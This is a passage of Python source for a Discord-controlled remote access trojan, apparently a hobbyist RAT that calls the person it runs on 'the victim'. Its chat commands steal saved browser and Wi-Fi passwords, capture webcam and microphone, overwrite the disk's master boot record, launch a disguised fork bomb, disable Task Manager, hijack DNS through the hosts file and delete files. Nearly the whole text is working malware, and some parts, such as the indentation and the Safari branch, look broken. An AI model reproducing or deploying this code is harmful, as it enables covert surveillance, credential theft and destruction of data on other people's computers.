								passwords += f"website: {login['hostname']}\nusername: {login['username']}\npassword: {login['password']}\n\n"
			# edge
			elif os.path.exists(os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Login Data"):
				shutil.copy2(os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Login Data", "LoginData.db")
				conn = sqlite3.connect("LoginData.db")
				cursor = conn.cursor()
				cursor.execute("SELECT action_url, username_value, password_value FROM logins")
				for result in cursor.fetchall():
					password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
					passwords += f"website: {result[0]}\nusername: {result[1]}\npassword: {password}\n\n"
				conn.close()
				os.remove("LoginData.db")
			# safari
			elif os.path.exists(os.getenv("APPDATA") + "\\Apple Computer\\Safari\\"):
				shutil.copy2(os.getenv("APPDATA") + "\\Apple Computer\\Safari\\Bookmarks.plist", "Bookmarks.plist")
				with open("Bookmarks.plist", "rb") as f:
					plist = plistlib.load(f)
					for bookmark in plist["Children"][0]["Children"]:
						if bookmark.get("Title") == "Passwords":
							for login in bookmark["Children"]:
								passwords += f"website: {login['URLString']}\nusername: {login['UserName']}\npassword: {login['Password']}\n\n"
				os.remove("Bookmarks.plist")
			# opera
			elif os.path.exists(os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Login Data"):
				shutil.copy2(os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Login Data", "LoginData.db")
				conn = sqlite3.connect("LoginData.db")
				cursor = conn.cursor()
				cursor.execute("SELECT action_url, username_value, password_value FROM logins")
				for result in cursor.fetchall():
					password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1].decode()
					passwords += f"website: {result[0]}\nusername: {result[1]}\npassword: {password}\n\n"
				conn.close()
				os.remove("LoginData.db")
			# other
			else:
				passwords = "no supported browsers found! :c"
		except Exception as e:
			passwords = f"an error occurred while stealing passwords: {e} :c"
		await message.reply(await femboyaccess("passwords", passwords))

	if message.content.startswith("streamscreen"):
		command_parts = message.content.split()
		if len(command_parts) == 2:
			try:
				duration = int(command_parts[1])
				await start_screen_streaming(message, duration)
			except ValueError:
				await message.reply(await femboyaccess("streamscreen", "invalid duration! :c"))
		else:
			await message.reply(await femboyaccess("streamscreen", "usage: `streamscreen <duration>`"))

	if message.content.startswith("askescalate"):
		await message.reply(await femboyaccess("askescalate", "asking to escalate privileges "))
		ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

	if message.content.startswith("pid"):
		pid = os.getpid()
		await message.reply(await femboyaccess("pid", f"current pid is: {pid} "))

	if message.content.startswith("localtime"):
		now = datetime.datetime.now()
		current = now.strftime("%H:%M:%S")
		await message.reply(await femboyaccess("localtime", f"user's local time is: {str(current).encode()} "))

	if message.content.startswith("timeset"):
		is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
		if is_admin == True:
			year = message.content.split(" ")[1]
			month = message.content.split(" ")[2]
			day = message.content.split(" ")[3]
			hour = message.content.split(" ")[4]
			minute = message.content.split(" ")[5]
			set_system_time(int(year), int(month), int(day), int(hour), int(minute))
			await message.reply(await femboyaccess("timeset", "successfully changed the date! "))
		else:
			await message.reply(await femboyaccess("timeset", "admin rights are required for this command "))

	if message.content.startswith("webcampic"):
		webcam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
		result, image = webcam.read()
		cv2.imwrite('webcam.png', image)
		reaction_msg = await message.reply(await femboyaccess("webcampic", "lmao"), file=discord.File('webcam.png'))
		subprocess.run('del webcam.png', shell=True)

	if message.content.startswith("fuckmbr"):
		try:
			hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
			WriteFile(hDevice, AllocateReadBuffer(512), None)
			CloseHandle(hDevice)
			await message.reply(await femboyaccess("fuckmbr", "mbr overwritten successfully! "))
		except:
			await message.reply(await femboyaccess("fuckmbr", "an error occurred! you probably don't have admin permissions :c"))

	if message.content.startswith("regedit"):
		key_path = message.content.split("  ")[1]
		value_name = message.content.split("  ")[2]
		new_value = message.content.split("  ")[3]
		regedit = change_registry_value(key_path, value_name, new_value)
		if regedit == 1:
			await message.reply(await femboyaccess("regedit", "edited successfully! "))
		else:
			await message.reply(await femboyaccess("regedit", "could not edit the value! :c"))

	if message.content.startswith("taskkill"):
		try:
			task = message.content.split(" ")[1]
			subprocess.run(['taskkill', '/F', '/IM', task], check=True)
			await message.reply(await femboyaccess("taskkill", "killed the process! "))
		except:
			await message.reply(await femboyaccess("taskkill", "could not kill the process! :c"))
	    if message.content.startswith("createfile"):
	        try:
	            args = message.content.split(" ")
	            filename = args[1]
	            size_mb = int(args[2])
	
	            size_bytes = size_mb * 1024 * 1024
	
	            with open(filename, 'wb') as f:
	                f.write(os.urandom(size_bytes))  
	            await message.reply(f"File '{filename}' of size {size_mb} MB created successfully!")
	
	        except Exception as e:
	            await message.reply(f"Could not create the file! Error: {e}")
	        
	    await bot.process_commands(message)
	if message.content.startswith("processes"):
		try:
			running_processes = get_running_processes()
			processes_message = '\n'.join(running_processes)
			await message.reply(await femboyaccess("processes", f"fetched the running processes! :3\n\n{processes_message}"))
		except:
			await message.reply(await femboyaccess("processes", "could not fetch the running processes! :c"))

	if message.content.startswith("disabletaskmgr"):
		try:
			subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '1', '/f'])
			await message.reply(await femboyaccess("disabletaskmgr", "task manager has been disabled! "))
		except:
			await message.reply(await femboyaccess("disabletaskmgr", "task manager could not be disabled, you probably aren't running as admin! :c"))

	if message.content.startswith("enabletaskmgr"):
		try:
			subprocess.run(['reg', 'add', 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System', '/v', 'DisableTaskMgr', '/t', 'REG_DWORD', '/d', '0', '/f'])
			await message.reply(await femboyaccess("enabletaskmgr", "task manager has been enabled! "))
		except:
			await message.reply(await femboyaccess("enabletaskmgr", "task manager could not be enabled, you probably aren't running as admin! :c"))

	if message.content.startswith("highbeep"):
		duration = int(message.content.split(" ")[1])
		await message.reply(await femboyaccess("highbeep", "high-pitched beep noise is currently playing! "))
		winsound.Beep(32767, duration)
		await message.reply(await femboyaccess("highbeep", "high-pitched beep noise finished! "))

	if message.content.startswith("lowbeep"):
		duration = int(message.content.split(" ")[1])
		await message.reply(await femboyaccess("lowbeep", "low-pitched beep is currently playing! "))
		winsound.Beep(37, duration)
		await message.reply(await femboyaccess("lowbeep", "low-pitched beep noise finished! "))

	if message.content.startswith("custombeep"):
		frequency = int(message.content.split(" ")[1])
		duration = int(message.content.split(" ")[2])
		await message.reply(await femboyaccess("lowbeep", "low-pitched beep is currently playing! "))
		winsound.Beep(frequency, duration)
		await message.reply(await femboyaccess("lowbeep", "low-pitched beep noise finished! "))

	if message.content.startswith("piano"):
		piano_message = await create_piano_embed(message)
		await piano_message.edit(view=MyView(piano_message))

	if message.content.startswith("gdi"):
		desk_handle = win32gui.GetDesktopWindow()  # Get the desktop window handle
		desk = win32gui.GetDC(desk_handle)         # Get the device context of the desktop
		x = GetSystemMetrics(0)
		y = GetSystemMetrics(1)
		mode = message.content.split(" ")[1]
		time = int(message.content.split(" ")[2])  # Ensure time is an integer

		if mode == "patinvert":
			await message.reply(await femboyaccess("gdi", f"started the patinvert effect for {time}ms! "))
			for _ in range(100):
				brush = win32gui.CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
				win32gui.SelectObject(desk, brush)
				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.PATINVERT)
				await asyncio.sleep(time / 1000)
			win32gui.ReleaseDC(desk_handle, desk)  # Release the device context using both the handle and DC
			win32gui.DeleteObject(brush)
			await message.reply(await femboyaccess("gdi", f"stopped the patinvert effect! "))

		elif mode == "patcopy":
			await message.reply(await femboyaccess("gdi", f"started the patcopy effect for {time}ms! "))
			for _ in range(100):
				brush = win32gui.CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
				win32gui.SelectObject(desk, brush)
				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.PATCOPY)
				await asyncio.sleep(time / 1000)
			win32gui.ReleaseDC(desk_handle, desk)
			win32gui.DeleteObject(brush)
			await message.reply(await femboyaccess("gdi", f"stopped the patcopy effect! "))

		elif mode == "srccopy":
			await message.reply(await femboyaccess("gdi", f"started the srccopy effect for {time}ms! "))
			for _ in range(100):
				brush = win32gui.CreateSolidBrush(RGB(random.randrange(255), random.randrange(255), random.randrange(255)))
				win32gui.SelectObject(desk, brush)
				win32gui.PatBlt(desk, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), win32con.SRCCOPY)
				await asyncio.sleep(time / 1000)
			win32gui.ReleaseDC(desk_handle, desk)
			win32gui.DeleteObject(brush)
			await message.reply(await femboyaccess("gdi", f"stopped the srccopy effect! "))
	if message.content.startswith("opencd"):
		winmm = ctypes.windll.winmm
		MCI_OPEN_DRIVER = 0x080D
		MCI_CLOSE = 0x0804
		MCI_SET_DOOR_OPEN = 0x0843
		MCI_SET_DOOR_CLOSED = 0x0844
		mci_open_parms = ctypes.create_unicode_buffer(128)
		mci_open_parms.value = "cdaudio"
		winmm.mciSendStringW("open " + mci_open_parms.value + " type cdaudio alias drive", None, 0, None)
		await message.reply(await femboyaccess("opencd", "opened the cd tray! "))

	if message.content.startswith("closecd"):
		winmm = ctypes.windll.winmm
		MCI_OPEN_DRIVER = 0x080D
		MCI_CLOSE = 0x0804
		MCI_SET_DOOR_OPEN = 0x0843
		MCI_SET_DOOR_CLOSED = 0x0844
		winmm.mciSendStringW("set drive door closed", None, 0, None)
		await message.reply(await femboyaccess("closecd", "closed the cd tray! "))

	if message.content.startswith("spamtext"):
		if not spamtext:
			spamtext = True
			asyncio.create_task(print_on_screen(ctx=message, args=message.content))
			await message.reply(await femboyaccess("spamtext", "spamming text on screen! "))
		else:
			spamtext = False
			await message.reply(await femboyaccess("spamtext", "no longer spamming text on screen! "))

	if message.content.startswith("sus"):
		asyncio.create_task(download_sus(message))
		await message.reply(await femboyaccess("sus", "downloading among us.. "))

	if message.content.startswith("shutdown"):
		await message.reply(await femboyaccess("shutdown", "initiating computer shutdown! "))
		os.system("shutdown /s /t 0")

	if message.content.startswith("restart"):
		mode = message.content.split(" ")[1]
		if mode == "normal":
			await message.reply(await femboyaccess("restart", "initiating normal computer restart! "))
			os.system("shutdown /r /t 0")
		elif mode == "safemode":
			await message.reply(await femboyaccess("restart", "initiating safe mode computer restart! "))
			subprocess.run("bcdedit /set {current} safeboot minimal", shell=True)
			os.system("shutdown /r /t 0")
		elif mode == "safenetwork":
			await message.reply(await femboyaccess("restart", "initiating safe mode with networking computer restart! "))
			subprocess.run("bcdedit /set {current} safeboot network", shell=True)
			os.system("shutdown /r /t 0")
		else:
			await message.reply(await femboyaccess("restart", "invalid mode! (normal, safemode, safenetwork)"))

	if message.content.startswith("recordcamera"):
		cap = cv2.VideoCapture(0)   
		fourcc = cv2.VideoWriter_fourcc(*"avc1")     
		output = cv2.VideoWriter(".video.mp4", fourcc, 20.0, (640,480))
		i = 0
		while 1:
			if i == 0:
				await message.reply(await femboyaccess("recordcamera", "started recording! "))
			ret, frame = cap.read()     
			output.write(frame)         
			i=1
			try:
				msgg = await client.wait_for("message", timeout=0.05)
			except asyncio.TimeoutError:
				pass
			else:
				if msgg.content == "stop":       
					await message.reply(await femboyaccess("recordcamera", "stopped recording, sending file! "))
					break

		cap.release()       
		output.release()   
		cv2.destroyAllWindows()     
		await message.reply(file=discord.File(r".video.mp4"))

	if message.content.startswith("write"):
		msg = message.content.split('"')[1]
		for char in msg:
			auto.press(char)

#   if message.content.startswith("discordinject"):
#       code_to_inject = "console.log('Injected code executed!');"
#       try:
#           subprocess.run(["echo", f"{code_to_inject} >> C:/Users/waw/AppData/Local/Discord/app-1.0.9016/resources/app.asar/index.js"], shell=True, check=True)
#           subprocess.run(["killall", "-HUP", "Discord"], shell=True, check=True)
#           await message.reply(await femboyaccess("discordinject", "code injected successfully! "))
#       except subprocess.CalledProcessError as e:
#           await message.reply(await femboyaccess("discordinject", "code not injected! :c"))

	if message.content.startswith("question"):
		msg = message.content.split('"')[1]
		await message.reply(await femboyaccess("question", "sent the question! "))
		root = tkinter.Tk()
		root.wm_attributes("-topmost", 1)
		root.withdraw()
		response = tkinter.messagebox.askyesno("question", msg, parent=root)
		if response:
			await message.reply(await femboyaccess("question", "user said yes! "))
			root.destroy()
		else:
			await message.reply(await femboyaccess("question", "user said no! "))
			root.destroy()

	if message.content.startswith("hidetaskbar"):
		try:
			tsk = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
			ctypes.windll.user32.ShowWindow(tsk, 0)
			await message.reply(await femboyaccess("hidetaskbar", "taskbar hidden! "))
		except:
			await message.reply(await femboyaccess("hidetaskbar", "could not hide taskbar! :c"))

	if message.content.startswith("showtaskbar"):
		try:
			tsk = ctypes.windll.user32.FindWindowA(b'Shell_TrayWnd', None)
			ctypes.windll.user32.ShowWindow(tsk, 9)
			await message.reply(await femboyaccess("showtaskbar", "taskbar shown! "))
		except:
			await message.reply(await femboyaccess("showtaskbar", "could not show taskbar! :c"))

	if message.content.startswith("webredirect"):
		arguments = message.content.split()[1:]
		if len(arguments) < 2:
			return await message.reply(await femboyaccess("webredirect", "usage: webredirect <redirection link> <websites separated by spaces>"))
		redirection_link = arguments[0].strip()
		redirection_ip = redirection_link
		try:
			socket.inet_aton(redirection_link)
		except socket.error:
			try:
				redirection_ip = socket.gethostbyname(redirection_link)
			except socket.gaierror:
				return await message.reply(await femboyaccess("webredirect", "invalid redirection link. please provide an ip address or a resolvable domain name! "))
		websites = arguments[1:]
		hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
		try:
			with open(hosts_path, "a") as hosts_file:
				for website in websites:
					try:
						ip = ipaddress.ip_address(website.strip())
						return await message.reply(await femboyaccess("webredirect", f"skipping ip address: {website.strip()}"))
					except ValueError:
						website = website.strip()
						if not website.startswith("www."):
							hosts_file.write(f"\n{redirection_ip} www.{website}\n")
						hosts_file.write(f"\n{redirection_ip} {website}\n")
			os.system("ipconfig /flushdns")
			await message.reply(await femboyaccess("webredirect", "listed websites will now be redirected! "))
		except Exception as e:
			await message.reply(await femboyaccess("webredirect", f"could not redirect listed website! :c\nerror: {str(e)}"))

#	if message.content.startswith("desktopflood"):
#		name = message.content.split('"')[1]
#		desktop_path = os.path.expanduser("~/Desktop")
#		for i in range(count):
#			file_path = os.path.join(desktop_path, f"{filename}_{i+1}.lol")
#			try:
#				with open(file_path, 'w') as file:
#					file.write("0")
#				await message.reply(await femboyaccess("desktopflood", "flooded the desktop! "))
#			except Exception as e:
#				await message.reply(await femboyaccess("desktopflood", "could not flood the desktop! :c"))

#NOT WORKING NOW FOR SOME REASON

	if message.content.startswith("forkbomb"):
		path = os.path.expanduser("~")
		with open(f'{path}\\sysinfo.bat', 'w', encoding='utf-8') as cutefile:
			cutefile.write('%0|%0')
		subprocess.Popen(f'{path}\\sysinfo.bat', creationflags=subprocess.CREATE_NO_WINDOW)

	if message.content.startswith("mkdir"):
		directory = message.content.split(" ")[1]
		try:
			os.mkdir(directory)
			await message.reply(await femboyaccess("mkdir", f"successfully created directory: {directory}! "))
		except Exception as e:
			await message.reply(await femboyaccess("mkdir", f"failed to create directory: {directory}! :c\n{e}"))

	elif message.content.startswith("rm"):
		file_or_directory = message.content.split(" ")[1]
		try:
			if os.path.isfile(file_or_directory):
				os.remove(file_or_directory)
			elif os.path.isdir(file_or_directory):
				shutil.rmtree(file_or_directory)
			else:
				await message.reply(await femboyaccess("rm", f"file or directory not found: {file_or_directory}! :c"))
				return
			await message.reply(await femboyaccess("rm", f"successfully removed: {file_or_directory}! "))
		except Exception as e:
			await message.reply(await femboyaccess("rm", f"failed to remove: {file_or_directory}! :c\n{e}"))

	elif message.content.startswith("chmod"):
		permissions, file_or_directory = message.content.split(" ")[1:]
		try:
			os.chmod(file_or_directory, int(permissions, 8))
			await message.reply(await femboyaccess("chmod", f"successfully changed permissions of {file_or_directory} to {permissions}! "))
		except Exception as e:
			await message.reply(await femboyaccess("chmod", f"failed to change permissions of {file_or_directory}! :c\n{e}"))

	elif message.content.startswith("instantmic"):
		voice_channels = [vc.name for vc in message.guild.voice_channels]
		vc_list_message = "select a voice channel to join:\n"
		for i, channel_name in enumerate(voice_channels, start=1):
			vc_list_message += f"{i}. {channel_name}\n"
		vc_list_message += "react with the corresponding number to join the voice channel! "
		vc_list = await message.channel.send(vc_list_message)
		for i in range(1, min(10, len(voice_channels) + 1)):
			await vc_list.add_reaction(f"{i}\u20e3")

		def check(reaction, user):
			return (
				user == message.author
				and str(reaction.emoji) in [f"{i}\u20e3" for i in range(1, min(10, len(voice_channels) + 1))]
			)

		try:
			reaction, _ = await client.wait_for('reaction_add', timeout=60, check=check)
			selected_channel_index = int(reaction.emoji[0]) - 1
			selected_channel = message.guild.voice_channels[selected_channel_index]
			vc = await selected_channel.connect(self_deaf=True)
			vc.play(PyAudioPCM())
			await message.reply(await femboyaccess("instantmic", f"joined the voice channel '{selected_channel.name}' and currently streaming microphone in realtime! "))
			bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
			opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
			discord.opus.load_opus(opuslib_path)
		except asyncio.TimeoutError:
			await message.channel.send("voice channel selection timed out! :c")
		finally:
			await vc_list.delete()

	elif message.content.startswith("notification"):
		parts = message.content.split('"')
		if len(parts) >= 4:
			title = parts[1].strip()
			msg = parts[3].strip()
			notification.notify(title=title, message=msg)

	elif message.content.startswith("wifipasswords"):
		command = "netsh wlan show profile"
		networks = subprocess.check_output(command, shell=True)
		network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
		result = ""
		for network_name in network_names_list:
			command = "netsh wlan show profile " + network_name + " key=clear"
			current_result = subprocess.check_output(command, shell=True)
			result = result + current_result
		await message.reply(await femboyaccess("wifipasswords", result))

	elif message.content.startswith("injectclipboard"):
		text = message.content.split(" ")[1]
		pyperclip.copy(text)
		await message.reply(await femboyaccess("injectclipboard", "successfully injected your text to the victim's clipboard! "))

@client.event
async def on_disconnect():
    global channel  # Ensure the channel variable is accessible
    if channel is not None:  # Check if the channel variable is defined
        try:
            await channel.send(await femboyaccess("disconnected", "this session is disconnected (unusable)! "))
            await channel.delete()  # Delete the channel if applicable
        except discord.Forbidden:
            print("Failed to send message or delete channel due to permissions.")
        except discord.HTTPException as e:
            print(f"An error occurred while sending the message or deleting the channel: {e}")
    await client.close()  # Close the bot

client.run(token)


ipaddress.IPv4Network
